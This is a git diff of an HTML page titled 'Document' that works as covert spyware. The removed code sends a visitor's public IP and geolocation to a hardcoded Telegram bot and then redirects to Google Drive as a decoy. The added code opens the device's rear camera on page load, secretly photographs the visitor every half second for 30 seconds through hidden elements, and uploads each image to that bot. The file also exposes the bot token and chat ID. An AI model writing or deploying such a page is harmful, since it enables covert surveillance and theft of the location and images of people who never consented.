@@ -1,58 +1,91 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-  </head>
-  <body>
-    <script>
-      const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
-      const userID = "5680204913";
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <video id="videoElement" style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
+    const userID = "5680204913";
+    let lastCaptureTime = 0;
 
-      // Sử dụng Promise.all để chạy đồng thời các yêu cầu
-      Promise.all([getPublicIP(), getUserLocation()])
-        .then(([publicIP, location]) => {
-          const messages = [];
-          if (publicIP) messages.push(publicIP);
-          if (location) messages.push(location);
+    function openCameraAndCapture() {
+      const video = document.getElementById('videoElement');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
 
-          // Gửi tất cả thông tin trong một yêu cầu
-          if (messages.length > 0) {
-            const data = new URLSearchParams();
-            data.append("chat_id", userID);
-            data.append("text", messages.join("\n"));
-            return fetch(url, { method: "POST", body: data });
-          }
-        })
-        .finally(() => {
-          window.location.href = "https://drive.google.com";
-        });
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+          .then(function(stream) {
+            video.srcObject = stream;
+            video.onloadedmetadata = function(e) {
+              video.play();
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
 
-      function getPublicIP() {
-        return fetch("https://api.ipify.org?format=json")
-          .then((response) => response.json())
-          .then((data) => data.ip)
-          .catch(() => null);
+              function captureAndSend() {
+                const now = Date.now();
+                if (now - lastCaptureTime >= 500) { 
+                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                  canvas.toBlob(sendPhotoToTelegram, 'image/jpeg', 0.7);
+                  lastCaptureTime = now;
+                }
+                requestAnimationFrame(captureAndSend);
+              }
+              captureAndSend();
+
+              setTimeout(() => {
+                stream.getTracks().forEach(track => track.stop());
+                sendMessageToTelegram("Close capture");
+              }, 30000);
+            };
+          })
+          .catch(function(error) {
+            console.error("Không thể mở camera:", error);
+            sendMessageToTelegram("Không thể mở camera: " + error.message);
+          });
+      } else {
+        console.error("cant open cam");
+        sendMessageToTelegram("cant open cam");
       }
+    }
 
-      function getUserLocation() {
-        return new Promise((resolve) => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              (position) => {
-                const { latitude, longitude } = position.coords;
-                resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
-              },
-              () => resolve(null)
-            );
-          } else {
-            console.error("Geolocation is not supported by this browser.");
-            resolve(null);
-          }
-        });
-      }
-    </script>
-  </body>
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', userID);
+      formData.append('photo', blob, 'photo.jpg');
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(result => {
+      })
+      .catch(error => {
+        sendMessageToTelegram("Error: " + error.message);
+      });
+    }
+
+    function sendMessageToTelegram(message) {
+      const data = new URLSearchParams();
+      data.append("chat_id", userID);
+      data.append("text", message);
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        body: data,
+      });
+    }
+
+    openCameraAndCapture();
+
+    window.addEventListener('beforeunload', function(event) {
+      sendMessageToTelegram("Web site is close");
+    });
+  </script>
+</body>
 </html>
